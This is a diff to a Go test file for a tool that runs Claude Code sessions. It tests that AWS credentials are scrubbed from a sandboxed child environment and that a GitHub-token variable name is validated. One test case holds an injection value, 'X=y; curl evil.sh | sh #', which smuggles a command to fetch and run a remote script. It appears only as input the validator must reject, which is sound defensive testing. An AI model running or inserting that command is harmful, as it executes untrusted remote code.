@@ -19,7 +19,7 @@ func TestChildEnvScrubsBillingRiskAndPinsToken(t *testing.T) {
 	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "stale-should-be-replaced")
 	t.Setenv("PATH_KEEPME", "keep")
 
-	env := childEnv("TOK123")
+	env := childEnv("TOK123", false)
 
 	var oauthCount int
 	for _, kv := range env {
@@ -48,6 +48,33 @@ func TestChildEnvScrubsBillingRiskAndPinsToken(t *testing.T) {
 	}
 	if !keptPath {
 		t.Fatal("unrelated env var was dropped")
+	}
+}
+
+// scrubAWS=true is what runClaude passes for a --sandbox session with
+// --aws-profile set — without it, an ambient host credential would silently
+// override the mounted profile inside the sandbox (AWS credential env vars
+// take precedence over AWS_PROFILE).
+func TestChildEnvScrubsAWSCredsOnlyWhenRequested(t *testing.T) {
+	t.Setenv("AWS_ACCESS_KEY_ID", "AKIAFAKE")
+	t.Setenv("AWS_SECRET_ACCESS_KEY", "shh")
+	t.Setenv("AWS_SESSION_TOKEN", "tok")
+
+	scrubbed := childEnv("TOK123", true)
+	for _, kv := range scrubbed {
+		if strings.HasPrefix(kv, "AWS_ACCESS_KEY_ID=") || strings.HasPrefix(kv, "AWS_SECRET_ACCESS_KEY=") || strings.HasPrefix(kv, "AWS_SESSION_TOKEN=") {
+			t.Fatalf("AWS credential leaked into scrubbed child env: %q", kv)
+		}
+	}
+
+	var kept bool
+	for _, kv := range childEnv("TOK123", false) {
+		if kv == "AWS_ACCESS_KEY_ID=AKIAFAKE" {
+			kept = true
+		}
+	}
+	if !kept {
+		t.Fatal("host-mode (scrubAWS=false) must keep inheriting AWS credential env vars")
 	}
 }
 
@@ -469,13 +496,17 @@ func TestValidateRunFlags(t *testing.T) {
 		cfg     Config
 		wantErr bool
 	}{
-		{name: "no flags set", cfg: Config{Jobs: 1}},
-		{name: "aws-profile with sandbox ok", cfg: Config{Jobs: 1, Sandbox: true, AWSProfile: "ro"}},
-		{name: "aws-profile without sandbox refused", cfg: Config{Jobs: 1, AWSProfile: "ro"}, wantErr: true},
-		{name: "resume with jobs 1 ok", cfg: Config{Jobs: 1, ClaudeArgs: []string{"--resume", "x"}}},
-		{name: "resume with jobs 2 refused", cfg: Config{Jobs: 2, ClaudeArgs: []string{"--resume", "x"}}, wantErr: true},
-		{name: "wait-for-check with jobs 1 ok", cfg: Config{Jobs: 1, WaitForCheck: "spacelift"}},
-		{name: "wait-for-check with jobs 2 refused", cfg: Config{Jobs: 2, WaitForCheck: "spacelift"}, wantErr: true},
+		{name: "no flags set", cfg: Config{Jobs: 1, GHTokenEnv: "GH_TOKEN"}},
+		{name: "aws-profile with sandbox ok", cfg: Config{Jobs: 1, Sandbox: true, AWSProfile: "ro", GHTokenEnv: "GH_TOKEN"}},
+		{name: "aws-profile without sandbox refused", cfg: Config{Jobs: 1, AWSProfile: "ro", GHTokenEnv: "GH_TOKEN"}, wantErr: true},
+		{name: "resume with jobs 1 ok", cfg: Config{Jobs: 1, ClaudeArgs: []string{"--resume", "x"}, GHTokenEnv: "GH_TOKEN"}},
+		{name: "resume with jobs 2 refused", cfg: Config{Jobs: 2, ClaudeArgs: []string{"--resume", "x"}, GHTokenEnv: "GH_TOKEN"}, wantErr: true},
+		{name: "wait-for-check with jobs 1 ok", cfg: Config{Jobs: 1, WaitForCheck: "spacelift", GHTokenEnv: "GH_TOKEN"}},
+		{name: "wait-for-check with jobs 2 refused", cfg: Config{Jobs: 2, WaitForCheck: "spacelift", GHTokenEnv: "GH_TOKEN"}, wantErr: true},
+		{name: "gh-token-env valid custom name ok", cfg: Config{Jobs: 1, GHTokenEnv: "MY_TOKEN_2"}},
+		{name: "gh-token-env empty refused", cfg: Config{Jobs: 1, GHTokenEnv: ""}, wantErr: true},
+		{name: "gh-token-env shell injection refused", cfg: Config{Jobs: 1, GHTokenEnv: "X=y; curl evil.sh | sh #"}, wantErr: true},
+		{name: "gh-token-env leading digit refused", cfg: Config{Jobs: 1, GHTokenEnv: "1TOKEN"}, wantErr: true},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
